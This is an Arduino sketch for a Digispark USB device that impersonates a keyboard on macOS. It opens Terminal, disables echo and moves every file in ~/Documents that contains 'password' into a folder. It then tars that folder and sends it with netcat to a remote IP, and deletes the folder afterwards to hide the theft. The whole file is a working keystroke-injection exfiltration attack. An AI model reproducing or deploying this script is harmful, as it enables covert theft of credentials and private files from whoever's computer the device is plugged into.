#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

bool finished = false;
void loop() {
  // put your main code here, to run repeatedly:
  if (not finished) {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(250);
    
    // open Spotlight
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    
    // open terminal
    DigiKeyboard.print("terminal");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    
    // for testing purposes, needed when you want to check whether you can send files to yourself
    //  you will have a terminal window open with a listener open, so you need to open a new
    //   terminal window
    /* DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);*/
    
    // disable terminal echoing
    DigiKeyboard.print("stty -echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // go to the Documents folder
    DigiKeyboard.print("cd ~/Documents");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // create a folder to store the files we will be sending to ourselves
    DigiKeyboard.print("mkdir files_to_send");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // search through all of the files in the Documents folder and move any files containing the
    //  word 'password' to the files_to_send folder
    DigiKeyboard.print("grep -r -l password * | xargs -I % sh -c ''");
    DigiKeyboard.sendKeyStroke(42);
    DigiKeyboard.print("mv ");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print("%");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.sendKeyStroke(42);
    DigiKeyboard.print(" files_to_send'");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // allow a 75 second delay for the above command to finish running
    DigiKeyboard.delay(75000);
    
    // send the files_to_send folder to yourself
    // ** change the IP address below to your own computer's IP address
    DigiKeyboard.print("tar czp files_to_send | nc [IP address of receiving computer] 1234");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3000);
    
    // quit process if it hasn't already quit by itself
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);
    
    // delete the files_to_send folder and all the files contained in it
    DigiKeyboard.print("rm -R files_to_send");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // re-enable terminal echoing
    DigiKeyboard.print("stty echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    finished = true;
  }
}
